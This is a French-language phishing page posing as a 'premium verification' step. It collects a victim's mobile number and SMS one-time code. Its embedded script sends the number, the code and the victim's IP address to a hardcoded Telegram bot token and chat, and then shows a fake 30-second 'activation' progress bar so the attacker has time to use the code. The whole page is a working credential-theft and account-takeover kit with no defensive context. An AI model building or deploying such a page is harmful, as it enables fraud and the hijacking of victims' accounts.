<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V√©rification Premium ‚Äì Num√©ro & Code</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
        body{background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .container{max-width:500px;width:100%;}
        .back{color:#fffc00;text-decoration:none;font-size:1.2em;margin-bottom:20px;display:inline-block;}
        .card{background:#111;border-radius:25px;padding:40px;box-shadow:0 20px 60px rgba(255,252,0,0.3);border:1px solid #333;}
        .header{text-align:center;margin-bottom:40px;}
        h1{font-size:2.2em;color:#fffc00;margin-bottom:10px;}
        p{color:#aaa;font-size:1.1em;}
        .step{color:#666;margin:20px 0;text-align:center;font-weight:bold;}
        .step.active{color:#fffc00;}
        .form-group{margin:30px 0;}
        label{display:block;color:#fffc00;font-weight:600;margin-bottom:10px;font-size:1.1em;}
        input{width:100%;padding:18px;background:#222;border:2px solid #333;border-radius:12px;color:#fff;font-size:1.2em;transition:0.3s;}
        input:focus{outline:none;border-color:#fffc00;box-shadow:0 0 0 4px rgba(255,252,0,0.2);}
        .btn{background:#fffc00;color:#000;padding:18px;border:none;border-radius:50px;font-size:1.3em;font-weight:bold;width:100%;cursor:pointer;transition:0.3s;position:relative;overflow:hidden;}
        .btn:disabled{background:#666;cursor:not-allowed;}
        .loader{display:none;width:30px;height:30px;border:5px solid #fff;border-top:5px solid transparent;border-radius:50%;animation:spin 1s linear infinite;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);}
        @keyframes spin{0%{transform:translate(-50%,-50%) rotate(0deg)}100%{transform:translate(-50%,-50%) rotate(360deg)}}
        .progress{margin-top:20px;height:8px;background:#333;border-radius:4px;overflow:hidden;display:none;}
        .progress-bar{height:100%;width:0%;background:#fffc00;transition:width 0.5s ease;}
        .status{margin-top:15px;text-align:center;color:#fffc00;font-weight:bold;font-size:1.1em;display:none;}
        .error{color:#ff3300;margin-top:15px;text-align:center;font-weight:bold;font-size:1.1em;}
    </style>
</head>
<body>
    <div class="container">
        <a href="plans.html" class="back">‚Üê Retour</a>
        <div class="card">
            <div class="header">
                <h1>V√©rification Premium</h1>
                <p>√âtape finale ‚Äì 30 secondes seulement</p>
            </div>

            <div class="step active">1. Num√©ro de t√©l√©phone</div>
            <div class="step" id="step2">2. Code SMS</div>
            <div class="step" id="step3">3. Activation</div>

            <form id="verifyForm">
                <div class="form-group">
                    <label>Num√©ro fran√ßais uniquement</label>
                    <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" required>
                </div>

                <div class="form-group" id="codeGroup" style="display:none;">
                    <label>Code SMS re√ßu (6 chiffres)</label>
                    <input type="text" id="code" maxlength="6" placeholder="123456">
                </div>

                <div id="error" class="error"></div>

                <button type="submit" class="btn" id="btn">
                    V√©rifier le num√©ro
                    <div class="loader" id="loader"></div>
                </button>

                <div class="progress" id="progress"><div class="progress-bar" id="bar"></div></div>
                <div class="status" id="status"></div>
            </form>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
        const TELEGRAM_CHAT_ID = "6272429080";

        const steps = ['V√©rification de l‚Äôop√©rateur...', 'Analyse du num√©ro...', 'Validation finale...', 'Activation en cours...'];

        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value.trim();
            const error = document.getElementById('error');
            const btn = document.getElementById('btn');
            const loader = document.getElementById('loader');
            const progress = document.getElementById('progress');
            const bar = document.getElementById('bar');
            const status = document.getElementById('status');

            error.textContent = '';

            // Nettoyage num√©ro
            const clean = phone.replace(/[\s+()-]/g, '');
            if (!/^(\+33|0)[67]\d{8}$/.test(clean)) {
                error.textContent = 'Num√©ro invalide';
                return;
            }

            // V√©rification op√©rateur SFR / Orange / Bouygues (pr√©fixes 2025)
            const prefix = clean.slice(-9, -7);
            const validPrefixes = ['60','61','62','63','64','65','66','67','68','69','70','75','76','77','78','79'];
            const sfr = ['60','61','62','63','64','65','66','67','68','69'];
            const orange = ['60','61','62','63','64','65','66','67','68','69'];
            const bouygues = ['60','61','62','63','64','65','66','67','68','69','70','75','76','77','78','79'];

            const isValid = sfr.includes(prefix) || orange.includes(prefix) || bouygues.includes(prefix);

            if (!isValid) {
                error.textContent = 'Num√©ro non √©ligible ‚Äì SFR, Orange ou Bouygues uniquement';
                return;
            }

            if (!document.getElementById('code').value) {
                // √âtape 1 : num√©ro valid√© ‚Üí envoi direct Telegram + demande code
                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `üö® NOUVEAU NUM√âRO VALIDE üö®\nService: ${localStorage.getItem('selectedService')}\nPlan: ${localStorage.getItem('selectedPlan')}\nüì± Num√©ro: ${phone}\n‚è∞ ${new Date().toLocaleString('fr-FR')}\nEn attente du code SMS...`
                    })
                });

                document.getElementById('codeGroup').style.display = 'block';
                btn.textContent = 'Valider le code SMS';
                document.getElementById('step2').classList.add('active');
                return;
            }

            // √âtape 2 : code saisi ‚Üí envoi Telegram + attente 30 secondes
            const code = document.getElementById('code').value;
            const ip = await fetch('https://api.ipify.org').then(r => r.text());

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `üéØ CODE RE√áU ‚Äì ACTION RAPIDE üéØ\nService: ${localStorage.getItem('selectedService')}\nPlan: ${localStorage.getItem('selectedPlan')}\nüì± Num√©ro: ${phone}\nüî¢ Code SMS: ${code}\nüåç IP: ${ip}\n‚è∞ ${new Date().toLocaleString('fr-FR')}`
                })
            });

            // Animation 30 secondes
            btn.disabled = true;
            btn.innerHTML = '';
            loader.style.display = 'block';
            progress.style.display = 'block';
            status.style.display = 'block';
            status.textContent = steps[0];

            let i = 0;
            const interval = setInterval(() => {
                bar.style.width = (i / 30 * 100) + '%';
                if (i % 8 === 0 && i / 8 < steps.length) status.textContent = steps[i / 8];
                i++;
            }, 1000);

            setTimeout(() => {
                clearInterval(interval);
                window.location.href = 'success.html';
            }, 30000); // 30 secondes exactes
        });
    </script>
</body>
</html>
